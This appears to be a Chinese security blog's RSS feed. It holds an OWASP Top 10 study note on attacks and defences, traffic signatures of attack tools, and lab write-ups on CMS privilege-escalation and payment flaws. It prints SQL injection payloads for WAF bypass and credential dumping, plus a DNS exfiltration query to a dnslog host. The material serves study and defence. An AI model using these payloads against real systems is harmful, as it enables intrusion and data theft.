&lt;h4 id=&#34;metasploit&#34;&gt;metasploit&lt;/h4&gt;
&lt;p&gt;木马相关。&lt;/p&gt;
&lt;p&gt;响应包有 MZ 标头和 cannot be run in DOS mode 字样。&lt;/p&gt;
&lt;p&gt;心跳包、固定 ua 头。&lt;/p&gt;
&lt;h4 id=&#34;nmapfscan&#34;&gt;nmap&amp;amp;fscan&lt;/h4&gt;
&lt;p&gt;扫描相关。&lt;/p&gt;
&lt;p&gt;共同特征。开 wireshark，请求包看到 window:1024 和 options(4 bytes): tcp option。&lt;/p&gt;
&lt;h4 id=&#34;frp&#34;&gt;frp&lt;/h4&gt;
&lt;p&gt;隧道相关。&lt;/p&gt;
&lt;p&gt;连接成功会看到 run_id。&lt;/p&gt;
&lt;h4 id=&#34;nps&#34;&gt;nps&lt;/h4&gt;
&lt;p&gt;隧道相关。&lt;/p&gt;
&lt;p&gt;第一个请求包末尾有版本号，例如 0.26.1.0。&lt;/p&gt;
&lt;p&gt;第二个请求包有 32 为双向认证。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/char/ - null</description>
        </item>
    
    
    
        <item>
        <title>OWASP Top 10 选讲</title>
        <link>https://xxxhidexxx.github.io/posts/sec/top10/</link>
        <pubDate>Mon, 15 Apr 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/top10/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/top10/ -&lt;p&gt;这里对 OWASP 在 2013、2017、2021 年提出的十大常规漏洞的原理和防御进行选择性的总结。OWASP 是一个致力于网络安全的国际非盈利组织，OWASP Top 10 是定期更新的报告，概述了 Web 应用程序安全性的安全问题，重点关注 10 个最关键的风险。&lt;/p&gt;
&lt;h3 id=&#34;ssrf&#34;&gt;ssrf&lt;/h3&gt;
&lt;h4 id=&#34;防御-ssrf&#34;&gt;防御 ssrf&lt;/h4&gt;
&lt;p&gt;（1）设置 url 白名单，限制内网 ip 的访问；&lt;/p&gt;
&lt;p&gt;（2）禁用非常规协议和端口，例如禁用除 http/s 之外的协议、禁用除 80/443 之外的端口；&lt;/p&gt;
&lt;p&gt;（3）统一报错信息，避免根据报错信息的不同判断内网 ip 端口的开放状态。&lt;/p&gt;
&lt;h4 id=&#34;利用-ssrf&#34;&gt;利用 ssrf&lt;/h4&gt;
&lt;p&gt;（1）dict 协议泄露了软件版本；&lt;/p&gt;
&lt;p&gt;（2）file 协议读取敏感文件；&lt;/p&gt;
&lt;p&gt;（3）gopher 协议反弹 shell；&lt;/p&gt;
&lt;p&gt;（4）http/s 协议扫描内网端口。&lt;/p&gt;
&lt;h4 id=&#34;ssrf-出现的场景&#34;&gt;ssrf 出现的场景&lt;/h4&gt;
&lt;p&gt;凡是用户输入的 url 和服务器进行交互的地方都可能存在 ssrf。例如：（1）用 url 分享网页信息；（2）在线翻译/转码；（3）图片加载/下载；（4）图片/文章的收藏；（5）未授权访问的页面里面有 ssrf；（6）url 锚点包含 ssrf。&lt;/p&gt;
&lt;h4 id=&#34;ssrf-绕过限制&#34;&gt;ssrf 绕过限制&lt;/h4&gt;
&lt;p&gt;ip rebind&lt;/p&gt;
&lt;h3 id=&#34;sql-注入&#34;&gt;sql 注入&lt;/h3&gt;
&lt;h4 id=&#34;sql-注入如何判断数据库类型&#34;&gt;sql 注入如何判断数据库类型&lt;/h4&gt;
&lt;p&gt;(1) 从语言习惯判断。&lt;/p&gt;
&lt;p&gt;asp：SQL Server，Access&lt;/p&gt;
&lt;p&gt;.net ：SQL Server&lt;/p&gt;
&lt;p&gt;php：Mysql，PostgreSql&lt;/p&gt;
&lt;p&gt;java：Oracle，Mysql&lt;/p&gt;
&lt;p&gt;（2）从默认端口判断。&lt;/p&gt;
&lt;p&gt;Mysql: 3306&lt;/p&gt;
&lt;p&gt;Oracle :1521&lt;/p&gt;
&lt;p&gt;SQL Server :1433&lt;/p&gt;
&lt;p&gt;PostgreSQL :5432&lt;/p&gt;
&lt;p&gt;Access : 文件型数据库没有默认端口&lt;/p&gt;
&lt;p&gt;（3）从页面报错判断。&lt;/p&gt;
&lt;p&gt;Oracle: ORA-00933:SQLcommand not properly ended&lt;/p&gt;
&lt;p&gt;SQL Server: Msg 170,level 15, State 1,Line 1&lt;/p&gt;
&lt;p&gt;Mysql: you have an error in your SQL syntax&lt;/p&gt;
&lt;p&gt;（4）从特有表判断&lt;/p&gt;
&lt;p&gt;几个数据库都可以使用 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1/test.php?id=1 and (select count(*) from 特有表)&amp;gt;0 and 1=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Oracle: sys.usr_tables&lt;/p&gt;
&lt;p&gt;Mysql: information_schema.tables&lt;/p&gt;
&lt;p&gt;SQL Server: sysobjects&lt;/p&gt;
&lt;p&gt;Access: msyobjects&lt;/p&gt;
&lt;p&gt;确认注入点之后把特有表带进去看看哪个不报错就是哪个。&lt;/p&gt;
&lt;h4 id=&#34;mysql-注入的常用函数有哪些&#34;&gt;mysql 注入的常用函数有哪些&lt;/h4&gt;
&lt;p&gt;查询字段用 order by，联合查询用 union select&lt;/p&gt;
&lt;p&gt;延时盲注用 sleep&lt;/p&gt;
&lt;p&gt;报错注入一般用 updatexml 和 extractvalue，用 floor 也可以&lt;/p&gt;
&lt;h4 id=&#34;冷门报错注入函数绕-waf&#34;&gt;冷门报错注入函数绕 waf&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;1&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.tables group by x)a) and &#39;1&#39;=&#39;1

and multipoint((select * from(select * from(select version())a)b))

and geometrycollection((select * from(select * from(select version())a)b))

or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#39;:&#39;,password) from manage),0x7e))) as asd))
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;宽字节注入的原理和条件是什么&#34;&gt;宽字节注入的原理和条件是什么&lt;/h4&gt;
&lt;p&gt;如果网站在用户输入的引号前面加了反斜杠进行转义，而网站使用 gbk 编码，则 sql 注入点符合宽字节注入的条件。&lt;/p&gt;
&lt;p&gt;payload: %df’+or+1=1#&lt;/p&gt;
&lt;p&gt;%df&amp;rsquo; 被十六进制编码变为 %df%5c%27，而 df5c 被 gbk 编码变为汉字“运”，从而单引号 %27 被解析。&lt;/p&gt;
&lt;h4 id=&#34;mysql-写-shell-的方法&#34;&gt;mysql 写 shell 的方法&lt;/h4&gt;
&lt;p&gt;（1）导出函数写 shell。一句话导出或者创建表导出，可以用函数 outfile 和 dumpfile。&lt;/p&gt;
&lt;p&gt;（2）日志文件写 shell。把日志设置成木马文件，将 shell 写进日志。&lt;/p&gt;
&lt;h4 id=&#34;mysql-无法写-shell-的原因&#34;&gt;mysql 无法写 shell 的原因&lt;/h4&gt;
&lt;p&gt;（1）打开 mysql 配置文件 My.ini 设置 secure_file_priv=null 可以禁止导入导出。与之相对，如果设置为 / 或者置空则无限制，如果设置为某个目录则在该目录下可以导入导出。从防守方的角度来看设置为 null 安全，可以用命令 show global variables like &amp;lsquo;%secure%&amp;rsquo; 快速检查配置。&lt;/p&gt;
&lt;p&gt;（2）绝对路径不正确则无法写 shell。从防守方的角度来看不泄露绝对路径可以防止 mysql 写 shell。&lt;/p&gt;
&lt;p&gt;（3）权限不足导致无法写 shell。没有 file 读写权限或者无权限开启日志记录。&lt;/p&gt;
&lt;p&gt;（4）在 PHP 设置中禁用魔术引号，即开启 GPC，对引号进行转义，则无法写 shell。&lt;/p&gt;
&lt;p&gt;（5）站库分离导致无法连接 mysql，则无法写 shell。&lt;/p&gt;
&lt;h4 id=&#34;如何利用-dns-外带-sql-注入结果&#34;&gt;如何利用 dns 外带 sql 注入结果&lt;/h4&gt;
&lt;p&gt;load_file 函数的作用是读取远程文件，可以解析 url。攻击者可以将 sql 注入的结果拼接到域名，在 dnslog 平台看到结果。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select load_file(concat(&#39;file:\\\\&#39;,(select database()),&#39;.qx7x7i.dnslog.cn&#39;));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;条件：secure_file_priv 选项必须为空，不能为null；对方的主机必须开放 445 端口。&lt;/p&gt;
&lt;h4 id=&#34;sqlmap-扫描-https-网站无法访问怎么办&#34;&gt;sqlmap 扫描 https 网站无法访问怎么办&lt;/h4&gt;
&lt;p&gt;（1）添加 &amp;ndash;force-ssl 参数；（2）走本地代理端口。&lt;/p&gt;
&lt;h4 id=&#34;mysql-通常采取哪种加密方式&#34;&gt;mysql 通常采取哪种加密方式&lt;/h4&gt;
&lt;p&gt;sha1，md5&lt;/p&gt;
&lt;h4 id=&#34;防御-sql-注入&#34;&gt;防御 sql 注入&lt;/h4&gt;
&lt;p&gt;（1）后端代码层面：&lt;/p&gt;
&lt;p&gt;正则过滤：不传输 payload&lt;/p&gt;
&lt;p&gt;预编译：不解析 payload&lt;/p&gt;
&lt;p&gt;转义：改写 payload 令其失效&lt;/p&gt;
&lt;p&gt;权限控制：就算解析 payload 语句攻击者也没有读写权限，攻击者得不到任何信息和权限。&lt;/p&gt;
&lt;p&gt;（2）网络传输层面：配置 waf 进行拦截，不把带有 payload 的语句传输到后端。&lt;/p&gt;
&lt;h4 id=&#34;order-by-能预编译吗&#34;&gt;order by 能预编译吗&lt;/h4&gt;
&lt;p&gt;不能，只能加 waf&lt;/p&gt;
&lt;h3 id=&#34;xss&#34;&gt;xss&lt;/h3&gt;
&lt;h4 id=&#34;xss-的原理&#34;&gt;xss 的原理&lt;/h4&gt;
&lt;p&gt;用户输入的 js 代码被浏览器解析了，那么 js 能做的就是 xss 能做的。&lt;/p&gt;
&lt;h4 id=&#34;xss-的危害&#34;&gt;xss 的危害&lt;/h4&gt;
&lt;p&gt;（1）盗取 cookie；（2）获取受害者 ip；（3）屏幕截图；（4）记录键盘输入；（5）前端 js 挖矿；（6）xss 蠕虫；（7）水坑攻击；（8）dos 攻击。&lt;/p&gt;
&lt;h4 id=&#34;xss-绕-waf&#34;&gt;xss 绕 waf&lt;/h4&gt;
&lt;p&gt;常用绕过方法：双写大小写、编码、找没被禁用的标签、没被禁用的事件、不常见的语句&lt;/p&gt;
&lt;h4 id=&#34;httponly-的绕过&#34;&gt;httponly 的绕过&lt;/h4&gt;
&lt;p&gt;有些接口会返回 set-cookie；用 ajax 或 flash 进行 http trace 攻击可以回显 cookie。&lt;/p&gt;
&lt;h4 id=&#34;防御-xss&#34;&gt;防御 xss&lt;/h4&gt;
&lt;p&gt;过滤、实体编码、cookie 设置 http only、限制输入长度&lt;/p&gt;
&lt;h3 id=&#34;csrf&#34;&gt;csrf&lt;/h3&gt;
&lt;h4 id=&#34;csrf-的条件&#34;&gt;csrf 的条件&lt;/h4&gt;
&lt;p&gt;用户浏览器里面保存着有效的 cookie，并且使用同一个浏览器访问钓鱼链接。&lt;/p&gt;
&lt;h4 id=&#34;csrf-的防御&#34;&gt;csrf 的防御&lt;/h4&gt;
&lt;p&gt;（1）使用正确的 cors 配置，验证 origin 和 referer；&lt;/p&gt;
&lt;p&gt;（2）设置 csrf token，用户点击钓鱼链接不会携带 csrf token 就无法通过身份认证。&lt;/p&gt;
&lt;h3 id=&#34;xxe-注入&#34;&gt;xxe 注入&lt;/h3&gt;
&lt;h4 id=&#34;xxe-的危害&#34;&gt;xxe 的危害&lt;/h4&gt;
&lt;p&gt;因为后端解析了 xml 外部实体，并且支持 file 和 ftp 等协议，导致 xxe 注入可以造成访问内网、任意文件读取和下载、dos 攻击等危害。&lt;/p&gt;
&lt;h4 id=&#34;xxe-的防御&#34;&gt;xxe 的防御&lt;/h4&gt;
&lt;p&gt;XML 解析库在调用时严格禁止对外部实体的解析。&lt;/p&gt;
&lt;h3 id=&#34;文件包含漏洞&#34;&gt;文件包含漏洞&lt;/h3&gt;
&lt;h4 id=&#34;文件包含的原理&#34;&gt;文件包含的原理&lt;/h4&gt;
&lt;p&gt;文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。&lt;/p&gt;
&lt;h4 id=&#34;文件包含的利用&#34;&gt;文件包含的利用&lt;/h4&gt;
&lt;p&gt;（1）加载图片马；（2）包含被污染的日志进行 getshell；（3）file 协议造成任意文件读取&lt;/p&gt;
&lt;h3 id=&#34;java-反序列化&#34;&gt;java 反序列化&lt;/h3&gt;
&lt;h4 id=&#34;java-反序列化漏洞概述&#34;&gt;java 反序列化漏洞概述&lt;/h4&gt;
&lt;p&gt;字节流变为 java 对象称为反序列化，反之称为序列化。由于 java 反序列化方法的不慎调用，用户在 http 报文输入的字节流能够被后端当作 java 对象解析。因此攻击者可以利用这个漏洞构造恶意语句交给后端执行。主要危害是 rce 和 dos，现实中一般需要多个漏洞配合利用才能造成实际危害，称为反序列化利用链。&lt;/p&gt;
&lt;h4 id=&#34;jndi-注入&#34;&gt;jndi 注入&lt;/h4&gt;
&lt;p&gt;jndi 是 java 接口，可以访问命名和目录服务。jndi 的 lookup 方法的 uri 参数可控，攻击者注入一个恶意 url，存储一个 java payload，这个 url 被加载时 payload 被解析，造成了注入攻击。&lt;/p&gt;
&lt;h4 id=&#34;rmi&#34;&gt;rmi&lt;/h4&gt;
&lt;p&gt;rmi 即远程方法调用，分为三个部分：客户端进行方法的调用，服务端提供方法、对代码进行解析，注册中心相当于一个字典，客户端调用服务端的方法时在注册中心进行查询和引用。&lt;/p&gt;
&lt;h4 id=&#34;java-反序列化利用工具&#34;&gt;java 反序列化利用工具&lt;/h4&gt;
&lt;p&gt;ysoserial 集成了很多利用链，只需要查看网站的第三方组件，然后在 ysoserial 里面找对应的利用链。&lt;/p&gt;
&lt;h4 id=&#34;java-反序列化的常见利用链&#34;&gt;java 反序列化的常见利用链&lt;/h4&gt;
&lt;h4 id=&#34;shiro550-和-shiro721-有什么区别&#34;&gt;shiro550 和 shiro721 有什么区别&lt;/h4&gt;
&lt;p&gt;shiro550 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串。&lt;/p&gt;
&lt;p&gt;shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。&lt;/p&gt;
&lt;p&gt;shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。&lt;/p&gt;
&lt;h4 id=&#34;fastjson-rce-流程&#34;&gt;fastjson rce 流程&lt;/h4&gt;
&lt;p&gt;fastjson 将 java 对象序列化为 json 字节流，将 json 字节流反序列化为 java 对象。fastjson 使用 rmi 或者 ldap 协议（远程方法调用、情形目录访问）。&lt;/p&gt;
&lt;p&gt;简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。&lt;/p&gt;
&lt;h4 id=&#34;如何判断-log4j2-是否利用成功&#34;&gt;如何判断 log4j2 是否利用成功&lt;/h4&gt;
&lt;p&gt;log4j2 是日志组件，其 lookups 机制存在 jndi 注入。&lt;/p&gt;
&lt;p&gt;（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；&lt;/p&gt;
&lt;p&gt;（2）查看目标主机是否存在 dnslog 活动；&lt;/p&gt;
&lt;p&gt;（3）查看是否下载恶意类。&lt;/p&gt;
&lt;h4 id=&#34;struts2-反序列化原理&#34;&gt;struts2 反序列化原理&lt;/h4&gt;
&lt;p&gt;Struts2 对标签属性执行 ognl（对象图形导航语言）解析，可造成 rce。&lt;/p&gt;
&lt;h4 id=&#34;weblogic-历史漏洞&#34;&gt;weblogic 历史漏洞&lt;/h4&gt;
&lt;p&gt;（1）t3 协议引起的反序列化漏洞；（2）Gadget 造成的 rce；（3）任意文件上传；（4）ssrf。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/top10/ - null</description>
        </item>
    
    
    
        <item>
        <title>熊海 CMS v1.0 越权登录管理员账号</title>
        <link>https://xxxhidexxx.github.io/posts/sec/lo5/</link>
        <pubDate>Wed, 13 Mar 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/lo5/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo5/ -&lt;p&gt;漏洞原理：我们添加一个用来占位的 cookie 保证 cookie 不为空，即可越权访问后台，并且可以避免跳转回登录页面。&lt;/p&gt;
&lt;p&gt;这个靶场演示的是熊海 CMS v1.0 的越权漏洞。&lt;/p&gt;
&lt;p&gt;尝试将 url 中的 ?r=login 改为 ?r=index 直接进后台，发现无效，会跳回登录页面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-0.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
&lt;p&gt;开 burp 拦截，在 cookie 中添加 user，值可以任意输入，例如将 &lt;code&gt;Cookie: PHPSESSID=b58boijgnqf8hcg1f62rgb94c3&lt;/code&gt; 改为 &lt;code&gt;Cookie: PHPSESSID=b58boijgnqf8hcg1f62rgb94c3；user=123&lt;/code&gt; 同时将 url 参数改为 ?r=index。发现直接进入管理员后台。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-1.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-2.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们刚才是用 burp 抓包修改 cookie，这个 cookie 没有保存，无法真正进入后台页面，随便点一个按钮就跳转回登录页面。因此我们用 cookie-editor 插件添加一个 user 并保存。就可以直接输入 url 越权访问管理员后台，也可以修改管理员账号密码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-3.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo5-4.png&#34; alt=&#34;lo5&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag=ywaq{xionghai-czyq}。（其实这个 flag 首页点评论就能看到，不需要操作。）&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/lo5/ - null</description>
        </item>
    
    
    
        <item>
        <title>MetInfo v4.0 越权修改密码</title>
        <link>https://xxxhidexxx.github.io/posts/sec/lo4/</link>
        <pubDate>Tue, 12 Mar 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/lo4/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo4/ -&lt;p&gt;这个靶场演示的是 MetInfo v4.0 的 nday。&lt;/p&gt;
&lt;p&gt;先注册一个账号，找到修改密码，然后抓包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-0.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-1.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 userid 改为任意用户，密码自己设置。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-2.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
&lt;p&gt;用其他人的用户名和自己设置的密码，成功登录到其他人的账号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo4-3.png&#34; alt=&#34;lo4&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入个人中心找到 flag=ywaq{uhgJHzxdIG}。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/lo4/ - null</description>
        </item>
    
    
    
        <item>
        <title>vl CMS 无密码登录</title>
        <link>https://xxxhidexxx.github.io/posts/sec/lo3/</link>
        <pubDate>Mon, 11 Mar 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/lo3/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo3/ -&lt;p&gt;打开靶场页面如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo3-1.png&#34; alt=&#34;lo3&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用 nday 已知信息，将 url 修改为 index.php?s=/member/res_login/ 并抓包。&lt;/p&gt;
&lt;p&gt;将 GET 改为 POST 并在结尾加上 id=1。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo3-2.png&#34; alt=&#34;lo3&#34;&gt;&lt;/p&gt;
&lt;p&gt;回到主页刷新，发现已经登录到其他人的账号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo3-3.png&#34; alt=&#34;lo3&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入个人中心得到 flag=ywaq{uhgzxdygfh}。&lt;/p&gt;
&lt;p&gt;添加 &amp;amp;id=1 是常用绕过手法。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/lo3/ - null</description>
        </item>
    
    
    
        <item>
        <title>easy CMS 支付逻辑漏洞</title>
        <link>https://xxxhidexxx.github.io/posts/sec/lo2/</link>
        <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/lo2/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo2/ -&lt;p&gt;我们打开这个 easyCMS 的靶场，为了测试支付逻辑，先随便注册一个账户并登录。&lt;/p&gt;
&lt;p&gt;打开购买商品的页面，尝试修改数量为负，发现有前端拦截。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-4.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-5.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
&lt;p&gt;开 burp 过前端拦截，抓到修改数量的包，将数量改为 -1，发现购买成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-3.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-1.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo2-2.png&#34; alt=&#34;lo2&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看订单，得到 flag=ywag{ijhzxdJHGt}。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/lo2/ - null</description>
        </item>
    
    
    
        <item>
        <title>大米 CMS 支付逻辑漏洞</title>
        <link>https://xxxhidexxx.github.io/posts/sec/lo1/</link>
        <pubDate>Sun, 10 Mar 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/lo1/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/lo1/ -&lt;p&gt;打开大米 CMS 的靶场，找到支付页面。提示必须登录才可以继续下一步，我们随便注册一个账户即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-1.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先发现这个数量可以直接修改成 -1，但是提交无效。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-4.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们还是用正常的购买流程，开 burp 拦截。修改参数 qty=-1，代表数量变为 -1，提交之后购买成功。&lt;/p&gt;
&lt;p&gt;可以看出这里直接将前端传递的参数作为金额和账户余额进行结算。因此我们将订单的产品数量修改为负数可以实现账户充值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-2.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-3.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xxxhidexxx.github.io/images/weblogic/lo1-7.png&#34; alt=&#34;lo1&#34;&gt;&lt;/p&gt;
&lt;p&gt;订单页面看到了 flag=ywaq{zxdijGcztU}。&lt;/p&gt;
- https://xxxhidexxx.github.io/posts/sec/lo1/ - null</description>
        </item>
    
    
  </channel>
</rss> 